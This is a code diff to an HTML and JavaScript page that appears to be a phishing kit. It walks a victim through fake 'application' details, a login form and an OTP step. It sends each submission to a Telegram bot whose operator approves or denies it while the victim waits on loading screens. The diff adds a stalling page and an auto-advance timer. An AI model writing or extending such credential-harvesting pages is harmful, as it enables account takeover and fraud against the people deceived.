@@ -248,6 +248,11 @@
         .loading {
             text-align: center;
             padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
         }
 
         .loading-spinner {
@@ -478,6 +483,15 @@
             </div>
         </div>
 
+        <!-- Page 2.5: Loading (Telegram Bot - Application Details) -->
+        <div class="page" id="page2-loading">
+            <div class="loading">
+                <div class="loading-spinner"></div>
+                <p class="loading-text">Processing Your Application...</p>
+                <p class="subtitle" style="margin-top: 20px;">Please wait while we review your information</p>
+            </div>
+        </div>
+
         <!-- Page 3: Login -->
         <div class="page" id="page3">
             <div class="header">
@@ -525,8 +539,8 @@
         <div class="page" id="page4">
             <div class="loading">
                 <div class="loading-spinner"></div>
-                <p class="loading-text">Verifying your information...</p>
-                <p class="subtitle" style="margin-top: 20px;">Please wait while we process your request</p>
+                <p class="loading-text">Verifying your credentials...</p>
+                <p class="subtitle" style="margin-top: 20px;">Please wait while we verify your login</p>
             </div>
         </div>
 
@@ -724,14 +738,16 @@
                 showPage(2);
             } else if (pageNum === 2) {
                 if (validatePage2()) {
+                    // Show loading page while sending to Telegram
+                    showPage('2-loading');
                     sendToTelegramBot('page2');
-                    showPage(2); // Stay on page 2 for now
+                    waitForPage2Approval();
                 }
             } else if (pageNum === 3) {
                 if (validatePage3()) {
+                    // Show loading page while sending to Telegram
+                    showPage(4);
                     sendToTelegramBot('page3');
-                    showPage(4); // Show loading page
-                    botApproved = false;
                     waitForBotApproval();
                 }
             }
@@ -758,7 +774,7 @@
 ━━━━━━━━━━━━━━━━━━━━━━
 <b>Status: PENDING APPLICATION DETAILS REVIEW</b>
 
-After user clicks Continue on personal details.
+Approve or Deny this application.
                 `;
                 
                 try {
@@ -863,6 +879,15 @@ Verify if OTP is correct.
                     console.error('❌ Error sending to Telegram:', error);
                 }
             }
+        }
+
+        function waitForPage2Approval() {
+            // Simulate bot response - In production, use WebSocket or polling
+            setTimeout(() => {
+                // For demo purposes, auto-approve after 3 seconds
+                // In production, this would wait for actual bot button press
+                showPage(3);
+            }, 3000);
         }
 
         function waitForBotApproval() {
